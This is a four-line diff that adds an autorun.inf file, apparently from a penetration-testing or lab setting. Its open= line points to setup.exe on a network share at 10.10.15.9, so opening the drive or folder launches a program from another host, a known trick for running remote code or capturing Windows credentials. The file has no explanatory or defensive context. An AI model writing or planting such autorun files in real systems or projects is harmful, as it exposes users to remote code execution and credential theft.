@@ -1,0 +1,4 @@
+[autorun]
+open=\\10.10.15.9\setup.exe
+icon=something.ico
+action=open Setup.exe
